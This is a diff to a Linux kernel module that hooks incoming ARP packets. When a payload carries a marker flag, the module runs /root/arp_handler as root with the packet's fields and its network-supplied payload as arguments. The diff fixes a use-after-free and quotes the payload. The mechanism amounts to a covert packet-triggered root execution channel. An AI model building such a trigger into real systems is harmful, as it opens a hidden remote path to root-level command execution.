@@ -78,14 +78,16 @@ static void arp_exec_work(struct work_struct *work) {
     printk(KERN_DEBUG "Queue length: %d", atomic_read(&work_count));
     struct arp_work *my_arp_work = container_of(work, struct arp_work, work);
 
-    char src_hw_str[18], src_proto_str[16], dst_hw_str[18], dst_proto_str[16];
+    char src_hw_str[18], src_proto_str[16], dst_hw_str[18], dst_proto_str[16], payload_str[PAYLOAD_LEN+3];
     
     snprintf(src_hw_str, sizeof(src_hw_str), "%pM", my_arp_work->src_hw);
     snprintf(src_proto_str, sizeof(src_proto_str), "%pI4", my_arp_work->src_proto);
     snprintf(dst_hw_str, sizeof(dst_hw_str), "%pM", my_arp_work->dst_hw);
     snprintf(dst_proto_str, sizeof(dst_proto_str), "%pI4", my_arp_work->dst_proto);
+    snprintf(payload_str, PAYLOAD_LEN+3, "\"%s\"", my_arp_work->payload);
+    kfree(my_arp_work);
 
-    char *argv[] = { "/root/arp_handler", src_hw_str, src_proto_str, dst_hw_str, dst_proto_str, my_arp_work->payload, NULL };
+    char *argv[] = { "/root/arp_handler", src_hw_str, src_proto_str, dst_hw_str, dst_proto_str, payload_str, NULL };
     char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
 
     // Debug printing
@@ -94,7 +96,6 @@ static void arp_exec_work(struct work_struct *work) {
     printk(KERN_INFO "Entering usermode\n");
     call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
     atomic_dec(&work_count);
-    kfree(my_arp_work);
 }
 // TODO: look into NF_STOLEN
 
@@ -154,7 +155,7 @@ unsigned int arp_exec_hook(void *priv, struct sk_buff *skb,
             payload_len = PAYLOAD_LEN;
         }
         strncpy(work->payload, arp_payload, payload_len); 
-        printk(KERN_DEBUG "%hd %hd %hd %hd %hd %hd %hd %hd", work->payload[0], work->payload[1], work->payload[2], work->payload[3], work->payload[4], work->payload[5], work->payload[6], work->payload[7]);
+        // printk(KERN_DEBUG "%hd %hd %hd %hd %hd %hd %hd %hd", work->payload[0], work->payload[1], work->payload[2], work->payload[3], work->payload[4], work->payload[5], work->payload[6], work->payload[7]);
 
         if(payload_len < strlen(FLAG)){
             printk(KERN_INFO "No payload");
